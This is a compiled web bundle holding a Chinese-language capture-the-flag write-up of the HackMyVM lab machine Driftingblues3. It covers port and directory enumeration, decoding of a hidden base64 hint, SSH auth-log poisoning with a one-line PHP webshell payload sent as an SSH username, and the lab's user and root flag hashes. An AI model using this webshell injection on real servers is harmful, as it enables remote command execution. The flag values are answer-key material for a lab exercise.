"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[7272],{7601:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>d,contentTitle:()=>o,default:()=>p,frontMatter:()=>a,metadata:()=>r,toc:()=>c});var i=t(5893),s=t(1151);const a={},o="Driftingblues3",r={id:"HackMyVM/Machines/Driftingblues3/index",title:"Driftingblues3",description:"[Linux VM] [Tested on VirtualBox] created by || tasiyanci",source:"@site/docs/HackMyVM/Machines/Driftingblues3/index.md",sourceDirName:"HackMyVM/Machines/Driftingblues3",slug:"/HackMyVM/Machines/Driftingblues3/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Driftingblues3/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Driftingblues3/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Connection",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Connection/"},next:{title:"Flower",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Flower/"}},d={},c=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"\u63a2\u6d4b web \u670d\u52a1",id:"\u63a2\u6d4b-web-\u670d\u52a1",level:2},{value:"<code>/wp-admin</code>",id:"wp-admin",level:3},{value:"<code>/secret</code>",id:"secret",level:3},{value:"<code>/privacy</code>",id:"privacy",level:3},{value:"<code>/robots.txt</code>",id:"robotstxt",level:3},{value:"\u63a2\u6d4b <code>/eventadmins</code>",id:"\u63a2\u6d4b-eventadmins",level:2},{value:"\u63a2\u6d4b <code>/adminsfixit.php</code>",id:"\u63a2\u6d4b-adminsfixitphp",level:2},{value:"user pwned",id:"user-pwned",level:2},{value:"root pwned",id:"root-pwned",level:2}];function l(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,s.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h1,{id:"driftingblues3",children:"Driftingblues3"}),"\n",(0,i.jsxs)(n.admonition,{type:"note",children:[(0,i.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || tasiyanci"}),(0,i.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2021-01-08"}),(0,i.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 4414608b527abba0a2893af3c2fd4cfd"}),(0,i.jsx)(n.p,{children:"\u2620 Root // 128"}),(0,i.jsx)(n.p,{children:"\ud83d\udc80 User // 127"}),(0,i.jsx)(n.p,{children:"\ud83d\udcddNotes //\nTested on and exported from virtualbox."})]}),"\n",(0,i.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u9776\u673a\u542f\u52a8",src:t(6769).Z+"",width:"1020",height:"687"})}),"\n",(0,i.jsx)(n.p,{children:"\u9776\u673a IP\uff1a"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.116\n"})}),"\n",(0,i.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.116\nHost is up (0.00038s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 6afed61723cb90792bb12d3753974658 (RSA)\n|   256 5bc468d18959d748b096f311871c08ac (ECDSA)\n|_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)\n80/tcp open  http    Apache httpd 2.4.38 ((Debian))\n|_http-title: Site doesn't have a title (text/html).\n| http-robots.txt: 1 disallowed entry\n|_/eventadmins\n|_http-server-header: Apache/2.4.38 (Debian)\nMAC Address: 08:00:27:25:7C:BA (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u63a2\u6d4b-web-\u670d\u52a1",children:"\u63a2\u6d4b web \u670d\u52a1"}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u8bbf\u95ee /",src:t(8850).Z+"",width:"1139",height:"763"})}),"\n",(0,i.jsx)(n.p,{children:"\u8fdb\u884c\u76ee\u5f55\u626b\u63cf"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"[19:05:30] 200 -   11B  - /MANIFEST.MF\n[19:05:30] 200 -   11B  - /Makefile\n[19:05:37] 301 -  317B  - /drupal  ->  http://192.168.56.116/drupal/\n[19:05:38] 200 -    1KB - /index.html\n[19:05:41] 301 -  321B  - /phpmyadmin  ->  http://192.168.56.116/phpmyadmin/\n[19:05:41] 200 -  268B  - /phpmyadmin/\n[19:05:41] 301 -  318B  - /privacy  ->  http://192.168.56.116/privacy/\n[19:05:42] 200 -   37B  - /robots.txt\n[19:05:42] 301 -  317B  - /secret  ->  http://192.168.56.116/secret/\n[19:05:42] 200 -   90B  - /secret/\n[19:05:44] 200 -  947B  - /wp-admin/\n[19:05:44] 301 -  319B  - /wp-admin  ->  http://192.168.56.116/wp-admin/\n"})}),"\n",(0,i.jsx)(n.h3,{id:"wp-admin",children:(0,i.jsx)(n.code,{children:"/wp-admin"})}),"\n",(0,i.jsx)(n.p,{children:"\u8def\u5f84\u4e0b\u6ca1\u6709\u6570\u636e"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"/wp-admin",src:t(9929).Z+"",width:"1139",height:"763"})}),"\n",(0,i.jsx)(n.h3,{id:"secret",children:(0,i.jsx)(n.code,{children:"/secret"})}),"\n",(0,i.jsx)(n.p,{children:"\u6ca1\u6709\u6709\u4ef7\u503c\u7684\u4fe1\u606f"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $http get http://192.168.56.116/secret/\nHTTP/1.1 200 OK\nAccept-Ranges: bytes\nConnection: Keep-Alive\nContent-Encoding: gzip\nContent-Length: 25\nContent-Type: text/html\nDate: Fri, 29 Dec 2023 11:09:21 GMT\nETag: "5a-5b812950a2c8b-gzip"\nKeep-Alive: timeout=5, max=100\nLast-Modified: Mon, 04 Jan 2021 12:53:52 GMT\nServer: Apache/2.4.38 (Debian)\nVary: Accept-Encoding\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'})}),"\n",(0,i.jsx)(n.h3,{id:"privacy",children:(0,i.jsx)(n.code,{children:"/privacy"})}),"\n",(0,i.jsx)(n.p,{children:"\u4e5f\u662f\u4e00\u6837\u7684\uff0c\u6ca1\u6709\u6709\u4ef7\u503c\u4fe1\u606f"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $http get http://192.168.56.116/privacy/\nHTTP/1.1 200 OK\nAccept-Ranges: bytes\nConnection: Keep-Alive\nContent-Encoding: gzip\nContent-Length: 26\nContent-Type: text/html\nDate: Fri, 29 Dec 2023 11:10:13 GMT\nETag: "b3-5b81296166a5e-gzip"\nKeep-Alive: timeout=5, max=100\nLast-Modified: Mon, 04 Jan 2021 12:54:10 GMT\nServer: Apache/2.4.38 (Debian)\nVary: Accept-Encoding\n\nABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABAB\n'})}),"\n",(0,i.jsx)(n.h3,{id:"robotstxt",children:(0,i.jsx)(n.code,{children:"/robots.txt"})}),"\n",(0,i.jsx)(n.p,{children:"\u5f97\u5230"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"User-agent: *\nDisallow: /eventadmins\n"})}),"\n",(0,i.jsxs)(n.h2,{id:"\u63a2\u6d4b-eventadmins",children:["\u63a2\u6d4b ",(0,i.jsx)(n.code,{children:"/eventadmins"})]}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u8bbf\u95ee"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $http get http://192.168.56.116/eventadmins/\nHTTP/1.1 200 OK\nAccept-Ranges: bytes\nConnection: Keep-Alive\nContent-Encoding: gzip\nContent-Length: 209\nContent-Type: text/html\nDate: Fri, 29 Dec 2023 11:12:23 GMT\nETag: "11d-5b811ce188721-gzip"\nKeep-Alive: timeout=5, max=100\nLast-Modified: Mon, 04 Jan 2021 11:58:15 GMT\nServer: Apache/2.4.38 (Debian)\nVary: Accept-Encoding\n\n<!DOCTYPE html>\n<html>\n<body>\n<p>man there\'s a problem with ssh</p>\n<p>john said "it\'s poisonous!!! stay away!!!"</p>\n<p>idk if he\'s mentally challenged</p>\n<p>please find and fix it</p>\n<p>also check /littlequeenofspades.html</p>\n<p>your buddy, buddyG</p>\n</body>\n</html>\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u5f97\u5230\u4e00\u4e2a\u8def\u5f84\uff1a ",(0,i.jsx)(n.code,{children:"/littlequeenofspades.html"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $http get http://192.168.56.116/littlequeenofspades.html\nHTTP/1.1 200 OK\nAccept-Ranges: bytes\nConnection: Keep-Alive\nContent-Encoding: gzip\nContent-Length: 544\nContent-Type: text/html\nDate: Fri, 29 Dec 2023 11:14:13 GMT\nETag: \"522-5b811c7f17c00-gzip\"\nKeep-Alive: timeout=5, max=100\nLast-Modified: Mon, 04 Jan 2021 11:56:32 GMT\nServer: Apache/2.4.38 (Debian)\nVary: Accept-Encoding\n\n<!DOCTYPE html>\n<html>\n<body>\n<p>Now, she is a little queen of spades, and the men will not let her be                                </p>\n<p>Mmmm, she is the little queen of spades, and the men will not let her be             </p>\n<p>Everytime she makes a spread, hoo fair brown, cold chill just runs all over me       </p>\n<p>I'm gon' get me a gamblin' woman, if the last thing that I do                        </p>\n<p>Eee, gon'get me a gamblin' woman, if it's the last thing that I do                  </p>\n<p>Well, a man don't need a woman, ooh fair brown, that he got to give all his money to </p>\n<p>Everybody say she got a mojo, now she's been usin' that stuff                        </p>\n<p>Mmmm, mmmm, 'verybody says she got a mojo,'cause she been usin' that stuff          </p>\n<p>But she got a way trimmin'down, hoo fair brown, and I mean it's most too tough      </p>\n<p>Now, little girl, since I am the king, baby, and you is a queen                      </p>\n<p>Ooo eee, since I am the king baby, and you is a queen                                </p>\n<p>Le's us put our heads together, hoo fair brown, then we can make our money green     </p>\n<p style=\"color:white\">aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==</p>\n</html>\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5bf9\u5176\u4e2d\u7684 base64 \u7f16\u7801\u8fdb\u884c\u5206\u6790"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==\n\n--\x3e intruder? L2FkbWluc2ZpeGl0LnBocA==\n\n--\x3e /adminsfixit.php\n"})}),"\n",(0,i.jsxs)(n.h2,{id:"\u63a2\u6d4b-adminsfixitphp",children:["\u63a2\u6d4b ",(0,i.jsx)(n.code,{children:"/adminsfixit.php"})]}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u8bbf\u95ee"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $http get http://192.168.56.116/adminsfixit.php\nHTTP/1.1 200 OK\nConnection: Keep-Alive\nContent-Encoding: gzip\nContent-Length: 949\nContent-Type: text/html; charset=UTF-8\nDate: Fri, 29 Dec 2023 11:20:19 GMT\nKeep-Alive: timeout=5, max=100\nServer: Apache/2.4.38 (Debian)\nVary: Accept-Encoding\n\n<!DOCTYPE html>\n<html>\n<body>\n<p>#######################################################################</p>\n<p>ssh auth log</p>\n<p>============</p>\n<p>i hope some wacky and uncharacteristic thing would not happen</p>\n<p>this job is fucking poisonous and im boutta planck length away from quitting this hoe</p>\n<p>-abuzer komurcu</p>\n<p>#######################################################################</p>\n<p> </p>\n<p> </p>\n</html>\nDec 29 04:51:01 driftingblues CRON[751]: pam_unix(cron:session): session opened for user root by (uid=0)\nDec 29 04:51:01 driftingblues CRON[751]: pam_unix(cron:session): session closed for user root\nDec 29 04:52:01 driftingblues CRON[755]: pam_unix(cron:session): session opened for user root by (uid=0)\nDec 29 04:52:01 driftingblues CRON[755]: pam_unix(cron:session): session closed for user root\nDec 29 04:53:01 driftingblues CRON[759]: pam_unix(cron:session): session opened for user root by (uid=0)\nDec 29 04:53:01 driftingblues CRON[759]: pam_unix(cron:session): session closed for user root\nDec 29 04:53:14 driftingblues sshd[763]: Did not receive identification string from 192.168.56.102 port 45318\nDec 29 04:53:21 driftingblues sshd[764]: Protocol major versions differ for 192.168.56.102 port 34908: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2 vs. SSH-1.5-Nmap-SSH1-Hostkey\nDec 29 04:53:21 driftingblues sshd[765]: Protocol major versions differ for 192.168.56.102 port 34918: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2 vs. SSH-1.5-NmapNSE_1.0\nDec 29 04:53:22 driftingblues sshd[766]: Unable to negotiate with 192.168.56.102 port 34934: no matching host key type found. Their offer: ssh-dss [preauth]\nDec 29 04:53:22 driftingblues sshd[768]: Connection closed by 192.168.56.102 port 34940 [preauth]\nDec 29 04:53:22 driftingblues sshd[770]: Connection closed by 192.168.56.102 port 34952 [preauth]\nDec 29 04:53:22 driftingblues sshd[772]: Unable to negotiate with 192.168.56.102 port 34962: no matching host key type found. Their offer: ecdsa-sha2-nistp384 [preauth]Dec 29 04:53:22 driftingblues sshd[774]: Unable to negotiate with 192.168.56.102 port 34978: no matching host key type found. Their offer: ecdsa-sha2-nistp521 [preauth]Dec 29 04:53:22 driftingblues sshd[776]: Connection closed by 192.168.56.102 port 34992 [preauth]\nDec 29 04:54:01 driftingblues CRON[778]: pam_unix(cron:session): session opened for user root by (uid=0)\nDec 29 04:54:01 driftingblues CRON[778]: pam_unix(cron:session): session closed for user root\nDec 29 04:55:01 driftingblues CRON[787]: pam_unix(cron:session): session opened for user root by (uid=0)\n......\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u53ef\u4ee5\u53d1\u73b0\u5176\u4e3a SSH \u7684\u65e5\u5fd7\u6570\u636e\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5c06 webshell \u8f93\u5165\u8fdb SSH \u65e5\u5fd7\u4e2d\uff0c\u4ece\u800c\u5b9e\u73b0 web \u670d\u52a1\u79cd\u9a6c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[\u2717]\u2500[randark@randark-Parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ssh '<?php system($_POST[\u201ccmd\u201d]);?>'@192.168.56.116\n<?php system($_POST[\\342\\200\\234cmd\\342\\200\\235]);?>@192.168.56.116: Permission denied (publickey).\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u7136\u540e\u5c31\u4f1a\u53d1\u73b0\u8bbf\u95ee ",(0,i.jsx)(n.code,{children:"/adminsfixit.php"})," \u4e0d\u4f1a\u8fd4\u56de\u6570\u636e\u4e86\uff0c\u5176\u5b9e\u5c31\u662f\u79cd\u4e0b\u7684 webshell \u88ab\u89e3\u6790\u4e86\uff0c\u5c1d\u8bd5\u4f7f\u7528\u8681\u5251\u8fdb\u884c\u8fde\u63a5"]}),"\n",(0,i.jsxs)(n.admonition,{type:"warning",children:[(0,i.jsx)(n.p,{children:"\u79cd\u9a6c\u65f6\u6ce8\u610f\u81ea\u5df1\u7684 payload\uff0c\u5426\u5219\u4f1a\u9762\u4e34\u5165\u53e3\u70b9\u76f4\u63a5\u5d29\u6389"}),(0,i.jsx)(n.p,{children:"\uff08\u6211\u7684\u9776\u673a\u5df2\u7ecf\u6ca1\u6551\u4e86\uff09"})]}),"\n",(0,i.jsx)(n.h2,{id:"user-pwned",children:"user pwned"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="/home/robertj/user.txt"',children:"413fc08db21285b1f8abea99040b0280\n"})}),"\n",(0,i.jsx)(n.h2,{id:"root-pwned",children:"root pwned"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="/root/root.txt"',children:"dfb7f604a22928afba370d819b35ec83\n"})})]})}function p(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(l,{...e})}):l(e)}},8850:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image_20231206-190640-6903629e874f22b96143442620160591.png"},9929:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image_20231208-190835-374a92890ac8df77b1315b96d9698153.png"},6769:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image_20231252-185237-d96418089ee361dc24aeef718f9df619.png"},1151:(e,n,t)=>{t.d(n,{Z:()=>r,a:()=>o});var i=t(7294);const s={},a=i.createContext(s);function o(e){const n=i.useContext(a);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),i.createElement(a.Provider,{value:n},e.children)}}}]);